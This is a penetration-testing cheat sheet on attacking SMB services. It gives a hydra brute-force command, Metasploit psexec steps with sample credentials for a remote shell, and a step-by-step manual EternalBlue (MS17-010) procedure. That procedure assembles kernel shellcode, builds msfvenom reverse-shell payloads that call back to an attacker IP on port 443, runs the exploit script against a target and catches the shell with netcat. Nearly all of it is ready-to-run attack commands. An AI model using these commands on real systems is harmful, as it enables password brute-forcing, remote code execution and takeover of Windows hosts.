# SMB Exploits 

Most of the time, using SMB as the point of insertion is not the objective, however it's always important to check
for misconfigurations or vulnerabilities that can be exploited in any service. Here, there is a basic overview of
exploitating SMB services.

1. SMB Login Bruteforce 

	hydra -L [username list] -P [password list] 192.168.1.101 smb

2. PSexec SMB2Shell

	Once you have SMB login credential of target machine then with the help of the following module of 
	Metasploit you can sometimes obtain meterpreter session to access the remote shell.

	use exploit/windows/smb/psexec
	msf exploit windows/smb/psexec) > set rhost 192.168.1.101
	msf exploit(windows/smb/psexec) > set smbuser raj
	msf exploit(windows/smb/psexec) > set smbpass 123
	msf exploit(windows/smb/psexec) > exploit

3. Eternal Blue 
	
	MS17-010, or as it's more commonly known- the infamous "Eternal Blue", can be exploited through Metasploit
	but it can also be exploited manually. The Metasploit method is simple enough to understand, so the manual
	method is detailed here. 

	1. Look in the exploits/MS17-010/shellcode directory. This directory holds the kernel shellcode. 

	2. Assemble the x64 kernel shellcode with nasm:
	
		nasm -f bin exploits/MS17-010/shellcode/eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
	
	3. Generate the payload with msfvenom:

		msfvenom -p windows/x64/shell_reverse_tcp LPORT=443 LHOST=192.168.0.29 --platform windows 
		-a x64 --format raw -o sc_x64_payload.bin
	
	4. Concatonate payload & shellcode: 

		cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin

	5. Assemble the x86 kernel shellcode with nasm:

		nasm -f bin exploits/MS17-010/shellcode/eternalblue_kshellcode_x86.asm -o ./sc_x86_kernel.bin
	
	6. Generate the payload with msfvenom:

		msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=192.168.0.29 --platform windows -a x86 
		--format raw -o sc_x86_payload.bin
	
	7. Concatonate payload & shellcode:

		cat sc_x86_kernel.bin sc_x86_payload.bin > sc_x86.bin
	
	8. Merge the two payloads using the included eternalblue_sc_merge.py script:
		
		python MS17-010/shellcode/eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin

	9. The eternalblue scripts are located in MS17-010/ and have the following targets:

		eternalblue_exploit7.py:

    		Windows Server 2008 & R2
    		Windows Server 2012 & R2 (x86)
    		Windows Server 2016 (x64)
    		Windows Vista
    		Windows 7

		eternalblue_exploit8.py:

   		Windows Server 2012 (x64)
    		Windows 8.1 & RT
    		Windows 10 (x64) (build < 14393)

	10. You can then, finally, run the exploit using:

		python MS17-010/eternalblue_exploit7.py 192.168.0.31 sc_all.bin

	    And listening for the reverse shell using: 

	    	nc -lvnp 443
	
